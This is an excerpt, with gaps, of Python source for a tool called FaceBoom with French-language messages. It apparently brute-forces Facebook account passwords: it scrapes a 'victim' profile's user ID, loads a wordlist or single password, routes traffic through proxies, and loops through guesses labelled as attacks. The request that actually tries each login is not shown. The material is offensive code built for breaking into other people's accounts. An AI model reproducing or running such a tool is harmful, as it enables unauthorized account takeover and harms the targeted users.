...
class FaceBoom(object):
    ...
    def get_profile_id(self, target_profile):
        try:
            print(gr+"\n["+wi+"*"+gr+"] obtention de l'ID du profil cible... veuillez patienter"+wi)
            idre = re.compile('(?<="userID":").*?(?=")')
            con = requests.get(target_profile).text
            idis = idre.search(con).group()
            print(wi+"\n["+gr+"+"+wi+"]"+gr+" Profil cible"+wi+" ID: "+yl+idis+wi)
        except Exception:
            errMsg("Veuillez vérifier l'URL du profil de votre victime")
            sys.exit(1)
    ...
    sys.exit(1)
        ...
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Veuillez vérifier le chemin de votre liste de mots")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg("Invalid Password")
                print("[!] Le mot de passe doit comporter au moins 6 caractères")
                sys.exit(1)
        if proxy:
             if proxy.count(".") != 3:
             ...
             if faceboom.check_proxy(final_proxy):
                ...
                errMsg("Connection Échec")
                errMsg("Impossible de se connecter au proxy["+rd+str(proxy)+yl+"]")
                sys.exit(1)
        ...
        for passwd in passwords:
                ...
                write(wi+"["+yl+str(loop)+wi+"] Attaque ☠️[ {"+yl+str(passwd)+wi+"} ]")
                ...
                if single_passwd:
                    print(yl+"\n["+rd+"!"+yl+"] Desole: "+wi+"The Password[ "+yl+passwd+wi+" ] Is Not Correct"+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Veuillez essayer un autre mot de passe ou une autre liste de mots "+gr+":)"+wi)
                else:
                    print(yl+"\n["+rd+"!"+yl+"] Sorry: "+wi+"Je ne trouve pas le mot de passe correct dans  [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Veuillez essayer une autre liste de mots. "+gr+":)"+wi)
        sys.exit(1)
   else:
       print(parse.usage)
       sys.exit(1)
